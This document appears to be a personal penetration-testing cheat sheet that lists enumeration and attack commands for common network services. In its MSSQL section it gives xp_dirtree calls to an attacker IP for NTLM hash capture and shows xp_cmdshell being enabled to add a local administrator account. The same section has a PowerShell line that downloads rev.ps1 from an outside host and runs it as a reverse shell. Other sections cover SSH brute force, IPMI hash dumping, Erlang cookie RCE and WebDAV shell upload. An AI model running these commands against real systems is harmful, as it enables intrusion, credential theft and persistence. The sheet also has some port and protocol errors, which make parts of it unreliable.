
#### SMB 139/445
- About
		Server Message Block is a client-server protocol to regulate access to files using TCP for a three way handshake. 
		Samba
			alternative to SMB which implements a Common Internet File System (CIFS)
```
# SMB Enumeration
	nmap -Pn --script smb-vuln* -p139,445 X.X.X.X

# Identify Shares
	crackmapexec smb X.X.X.X -u '' -p '' --shares
	smbclient -N -L //X.X.X.X
	nmap --script smb-enum-shares -p139,445 X.X.X.X
	enum4linux -a -u "" -p "" <DC IP>
	smbmap -H x.x.x.x

# Grab all Hosts with SMB Signing Disabled
	crackmapexec smb NmapHostsSummary.txt --gen-relay-list smbrelay.txt

# User login
smbmap -u user -p password -d domain -H x.x.x.x -R recursive share listing --dir-only stays in the directory
```

#### SNMP 161

About
Simple network management protocol is created to monitor network devices as well as handle configuration tasks to make remote changes. Typical devices with SNMP are routers, switches, servers, IoT devices, etc.  This is done over UDP port 161 typically.
	
The SNMP access works by using the Management Information Base (MIB), an independent format for storing device information which is query able and provides a tree hierarchy. It contains Object Identifiers (OID) which provide information about the type, access rights, and description of the object. They are written in Abstract Syntax Notation One (ASN 1.). The MIBs don't contain data but explain where to find which information which returns an OID.
	
OID represents a node in the hierarchy, the long the chain the more specific. OIDs consist of integers concatenated by dot notation.
SNMPv1 - has no authentication mechanism and doesn't support encryption.	
SNMP2 (v2c) no longer in use and functions like v1.
SNMPv3 requires authentication and uses encryption.
Community strings are like passwords to determine if it can be viewed or not. 
Dangerous settings:
rwuser noauth - access to full OID without authentication
rwcommunity string X.X.X.X provides fill OID tree access
rwcommunity6 string IPv6 - same as above

```
# Find SNMP
nmap -sU -sT -p 161 X.X.X.X

#Find string
nmap -sU -p 161 --script snmp-brute X.X.X.X --script-args snmp-brute.communitiesdb=wordlist
onesixtyone -c WORDLIST X.X.X.X

#Enumerate
snmpwalk -v2c -c STRING X.X.X.X .    # the end . is VITAL

# Grep through SNMP
grep -i "login\|fail" findings.snmp
grep -i "trap"  findings.snmp
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" findings.snmp 

# Additional check
./changeme.py snmp://192.168.1.20
```
#### Mysql Port 1433 or 3306
- About
	Open source SQL database. MySQL clients retrieve data from the server and can modify the data. Typically, the credentials are stored in the files and database in cleartext. Remember all users by defaults can be guests in mssql meaning they can perform this attack and maybe xp_cmdshell

```
# Find the server
nmap --script mysql* -sV -sC -p 1433 X.X.X.X

# Connect to SQL
	mysql -u USERNAME -p PORT -h X.X.X.X
	mysql -u USERNAME -p PORT -h X.X.X.X --windows-auth
	mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
	mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# Once Connected
	show databases;
	use <database name>;
	show tables;
	show <columns from TABLE>;
	select * from <table> or select column from <table>;

# Attack Vector 1: XP_dirtree (UNC Hash Attack)
	xp_dirtree '\\<attacker_IP>\any\thing'xp_dirtree '\\<attacker_IP>\any\thing'
	exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
	EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
	EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash
	sudo responder -I tun0
	sudo impacket-smbserver share ./ -smb2support
	msf> use auxiliary/admin/mssql/mssql_ntlm_stealer

# Attack Vector 2: xp_cmdshell (Remote code execution essentially)
	## Check if cmdshell is enabled
	select * FROM sys.configuration WHERE name = "xp_cmdshell"
	or just try 
	crackmapexec mssql -d <domain> -u <username> -p <password> -x "whoami"
	
	## Enable xp_cmdshell
	Login first 
	sp_configure 'show advanced options', '1', RECONFIGURE; sp_configure 'xp_cmdshell', '1'; RECONFIGURE
	
	## Attack
	EXEC  xp_cmdshell 'whoami'
	
	I like to add my own local admin user here now:
		EXEC xp_cmdshell 'net user testing password /add'
		EXEC xp_cmdshell 'net localgroup administrators testing /add'
	
	You can also add a reverse shell
		EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile

# MSSQL Escalate
1) crackmapexec mssql 10.10.10.1 -u username -p password –local-auth -M mssql_priv
2) crackmapexec mssql 10.10.10.1 -u username -p password –local-auth -M mssql_priv -o “ACTIONprivexec”
3) crackmapexec mssql 10.10.10.1 -u username -p password –local-auth -x whoami
4) crackmapexec mssql 10.10.10.1 -u username -p password –local-auth -o “ACTION-rollback”

------IF YOU HAVE ACCESS FROM WINDOWS but not externally
YOU CAN STILL do a dirtree relay

Impersonation

```

#### HTTP 80/8080
- About
	Insecure and outdated web server protocol.
```
# Vuln Scan
whatweb

# Default Logins
nuclei -l urls.txt -t /root/nuclei-templates/default-logins
```

#### SSH 22
- About
SSH is a remote connection protocol for management of hosts over a secure connection.
```
# If you find id_rsa and pub
You need to add the id_rsa.pub to your authorized_keys in /.ssh to use the private without a password. If it says invalid, try sudo with it.

# Default Creds
./changeme.py --protocols ssh,ssh_key 192.168.59.0/2

# Brute Force
hydra -l username  -P /usr/share/wordlists/rockyou.txt X.X.X.X ssh
Use -L users.txt
```

#### FTP
- About
	- Application layer protocol like HTTP and POP. Client and server establish a control port through 21 by client sending commands to the server which returns status codes. Then they communicated via port 20 for data transmission.
	- Active FTP the client established the connection over 21 and informs the server via which client-sid eport the server can transmit it responses. If a FW protects thae client, the server cant reply because external connections are blocked.
	- Passive mode - Server announces a port for the client to establish a data channel, since the client initiates the connection, the FW doesnt block it.
	- FTP Server response codes: https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes
	- Cleartext protocol so uh duh  its bad plus anonymous FTP login.

```
#Search for anonymous login
nmap -p 21 --script ftp-anon X.X.X.X/24

# Anony enabled
ftp x.x.x.x
	anonymous:anonymous
ls -lsa
	If you see it enter Extended passive mode, just wait a long time, it may show stuff still
```

#### FTP-Proxy 8021
- About
	Just a proxy for FTP
```
#Check for free-switch
nmap -sV X.X.X.X 

#Exploit
Has a msfconsole and an exploit DB Command Injection vulnerability
```

#### TFTP UDP 69
- About
	Doesnt provide user authentication like FTP, TFTP also uses UDP making it unreliable.  Does not have protected login with passwords.
How:
```
# Enumerate it
nmap -n -Pn -sU -p69 -sV --script tftp-enum X.X.X.X

# Download or upload
msf5> auxiliary/admin/tftp/tftp_transfer_util

# Bash Script Attack
git clone https://github.com/m4tx/pyTFTP && cd pyTFTP
```
#### SMTP
- About
	The `Simple Mail Transfer Protocol` (`SMTP`) is a protocol for sending emails in an IP network. It can be used between an email client and an outgoing mail server or between two SMTP servers. SMTP is often combined with the IMAP or POP3 protocols, which can fetch emails and send emails. In principle, it is a client-server-based protocol, although SMTP can be used between a client and a server and between two SMTP servers. In this case, a server effectively acts as a client.
	
	By default, SMTP servers accept connection requests on port `25`. However, newer SMTP servers also use other ports such as TCP port `587`. This port is used to receive mail from authenticated users/servers, usually using the STARTTLS command to switch the existing plaintext connection to an encrypted connection. The authentication data is protected and no longer visible in plaintext over the network. At the beginning of the connection, authentication occurs when the client confirms its identity with a user name and password. The emails can then be transmitted. For this purpose, the client sends the server sender and recipient addresses, the email's content, and other information and parameters. After the email has been transmitted, the connection is terminated again. The email server then starts sending the email to another SMTP server.
	
	SMTP works unencrypted without further measures and transmits all commands, data, or authentication information in plain text. To prevent unauthorized reading of data, the SMTP is used in conjunction with SSL/TLS encryption. Under certain circumstances, a server uses a port other than the standard TCP port `25` for the encrypted connection, for example, TCP port `465`.
	
	An essential function of an SMTP server is preventing spam using authentication mechanisms that allow only authorized users to send e-mails. For this purpose, most modern SMTP servers support the protocol extension ESMTP with SMTP-Auth. After sending his e-mail, the SMTP client, also known as `Mail User Agent` (`MUA`), converts it into a header and a body and uploads both to the SMTP server. This has a so-called `Mail Transfer Agent` (`MTA`), the software basis for sending and receiving e-mails. The MTA checks the e-mail for size and spam and then stores it. To relieve the MTA, it is occasionally preceded by a `Mail Submission Agent` (`MSA`), which checks the validity, i.e., the origin of the e-mail. This `MSA` is also called `Relay` server. These are very important later on, as the so-called `Open Relay Attack` can be carried out on many SMTP servers due to incorrect configuration. We will discuss this attack and how to identify the weak point for it a little later. The MTA then searches the DNS for the IP address of the recipient mail server.
	
	On arrival at the destination SMTP server, the data packets are reassembled to form a complete e-mail. From there, the `Mail delivery agent` (`MDA`) transfers it to the recipient's mailbox.
	
	|Client (`MUA`)|`➞`|Submission Agent (`MSA`)|`➞`|Open Relay (`MTA`)|`➞`|Mail Delivery Agent (`MDA`)|`➞`|Mailbox (`POP3`/`IMAP`)|
	|---|---|---|---|---|---|---|---|---|
	
	But SMTP has two disadvantages inherent to the network protocol.
	
	1. The first is that sending an email using SMTP does not return a usable delivery confirmation. Although the specifications of the protocol provide for this type of notification, its formatting is not specified by default, so that usually only an English-language error message, including the header of the undelivered message, is returned.
	    
	2. Users are not authenticated when a connection is established, and the sender of an email is therefore unreliable. As a result, open SMTP relays are often misused to send spam en masse. The originators use arbitrary fake sender addresses for this purpose to not be traced (mail spoofing). Today, many different security techniques are used to prevent the misuse of SMTP servers. For example, suspicious emails are rejected or moved to quarantine (spam folder). For example, responsible for this are the identification protocol [DomainKeys](http://dkim.org/) (`DKIM`), the [Sender Policy Framework](https://dmarcian.com/what-is-spf/) (`SPF`).
	    
	
	For this purpose, an extension for SMTP has been developed called `Extended SMTP` (`ESMTP`). When people talk about SMTP in general, they usually mean ESMTP. ESMTP uses TLS, which is done after the `EHLO` command by sending `STARTTLS`. This initializes the SSL-protected SMTP connection, and from this moment on, the entire connection is encrypted, and therefore more or less secure. Now [AUTH PLAIN](https://www.samlogic.net/articles/smtp-commands-reference-auth.htm) extension for authentication can also be used safely.

```
#Enumerate
sudo nmap X.X.X.X -sC -sV -p25

#Check for Open Relay
sudo nmap X.X.X.X -p25 --script smtp-open-relay -v

# Initiate a Sessions
HELO mail1.domian.local

EHLO mail1

# Enumerate Users on the system
VRFY <USERNAME>

# Send an Email
EHLO domain.local

Mail from: <EMAIL>
RCPT TO: <EMAIL>
DATA
add information
QUIT
```

#### IPMI udp 623
- About
	Intelligent Platform Management Interface](https://www.thomas-krenn.com/en/wiki/IPMI_Basics) (`IPMI`) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host's BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host.
```
# Enumerate IPMI
sudo nmap -sU --script ipmi-version -p 623 ilo.domain.local

# Metasploit
use auxiliary/scanner/ipmi/ipmi_version
use auxiliary/scanner/ipmi/ipmi_dumphashes

# Crack the Hash
The metasploit module attempts to crack the hash automatically but its best to take offline and crack with hashcat module -7300
```
#### 2049 NFS
- About
	Network File System is a similair protocol to SMB to allow access to file systems but for linux. It can't talk to SMB servers directly. 
```
 # Enumerating
 sudo nmap X.X.X.X -p111,2049 -sV -sC
 sudo nmap --script nfs* X.X.X.X -sV -p111,2049

# Show Available NFS shares
	showmount -e X.X.X.X
	
#Mount Share
	sudo mount -t nfs <X.X.X.X>:/ ./target-NFS/ -o nolock

#List items
	ls -l /mnt/nfs

#List Contents with UIDs and GUIDs
	ls -n mnt/nfs

#Unmount
	sudo umount ./target-nfs
	
 https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting
```

#### LDAP 
- About
	Lightweight Directory Access protocol is a protocol to look up information in the network. Allows features like users looking for a printer etc but typically an authentication mechanism. Used in Active Directory.
```
# DC Nulls
ldapsearch -x -h X.X.X.X -s base
nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>

# With Credentials
# Domain users
ldapsearch -LLL -x -H ldap://<DC.IP> -D "<USER>@<DOMAIN.NAME>" -w '<PASSWORD>' -b dc=<DOMAIN NAME>,dc=<DOMAIN NAME> -o ldif-wrap=no "(&(objectClass=user)(objectCategory=person))" name sAMAccountName userPrincipalName memberOf primaryGroupID adminCount userAccountControl description servicePrincipalName objectSid pwdLastSet lastLogon -E pr=1000/noprompt | tee domain_users.txt

# Domain computers
ldapsearch -LLL -x -H ldap://<DC.IP> -D "<USER>@<DOMAIN.NAME>" -w '<PASSWORD>' -b dc=<DOMAIN NAME>,dc=<DOMAIN NAME> -o ldif-wrap=no "(objectClass=computer)" name dNSHostname memberOf operatingSystem operatingSystemVersion lastLogonTimestamp servicePrincipalName description userAccountControl | tee domain_computers.txt

# Domain groups
ldapsearch -LLL -x -H ldap://<DC.IP> -D "<USER>@<DOMAIN.NAME>" -w '<PASSWORD>' -b dc=<DOMAIN NAME>,dc=<DOMAIN NAME> -o ldif-wrap=no "(objectClass=group)" name sAMAccountName memberOf member description objectSid | tee domain_groups.txt

```

#### RPC
- About
	Remote Procedure Call is a software communication protocol that one program can use to request a service from a program located in another computer on a network without having to understand the network's details. RPC is used to call other processes on the remote systems like a local system. A procedure call is also sometimes known as a function call or a subroutine call.
```
# Null Connect
rpcclient -U '' -N X.X.X.X

# Sign in with credentials
rpcclient -U "DOMAIN/username%password" <domaincontroller name or IP>"

# Query Information
rpcclient> querydominfo
queryuser 0x457
dsr_enumtrustdom
enumdomains
enumdomusers
enumdomgroups
getdompwinfo
getdompwinfo
```

#### WinRM 47001/5985
- About
	Windows remote management protocol that allows for remote common management tasks.
```# We can sign in or brute force using evil-winrm
evil-winrm -u <username> -p <password> -i <IP>/<domain>
evil-winrm -u <username> -H <hash> -i <IP>/<domain>
```

#### Telnet 21
- About
	Insecure remote connection protocol that transmits cleartext data.
```
telnet X.X.X.X
```

#### Ntp UDP 123
- About
	Network time protocol sets the time across all machines in the network when configured.
```
nmap -sU -sV --script "ntp* and (discovery or vuln) and not (dos or brute)" -p 123 <IP>
```

#### VNC
- About
	Remote management technology to remote into the desktop.
```
Check for null access
```

#### Erlang 4369 
- About
	This is the Erlang port mapper daemon acting as a name server for hosts running the ERLANG language. Essentially it creates a map of symbolic node names to machine addresses. 
```
#Enumerate
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info <IP>

# RCE Identification - You need to leak the Authentication Code
erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn

#Metasploit Module
msf5> use exploit/multi/misc/erlang_cookie_rce
```

#### Java JMX Agent 1099
- About
	- Java Management Extensions enabled resources to be encapsulated as java objects and be exposed as managhement resources. I.E. you can access the device remotely in some cases.
```
Metasploit has a module for RCE
```

#### Webdav
- About
	Protocol that allows users to share, copy, move, and edit data on a web server running HTTP.
```
# If we see IIS anywhere, look for Webdav
msfconsole > auxiliary/scanner/http/webdav_scanner > OPTIONS PATH=/dav/
 RHOSTS and RPORT                                                                           

# Other method to ID
davtest -url <URL>/dav      

Important but responder WILL capture these login hashes.

# Attack
cadaver <URL>/dav    You would want to upload a reverse http shell once connected and then navigate to the file.  DEFAULT CREDS: jigsaw:jigsaw  
```


ORACLE
Oracle WebLogic Server Deserialization RCE (CVE-2018-2893)
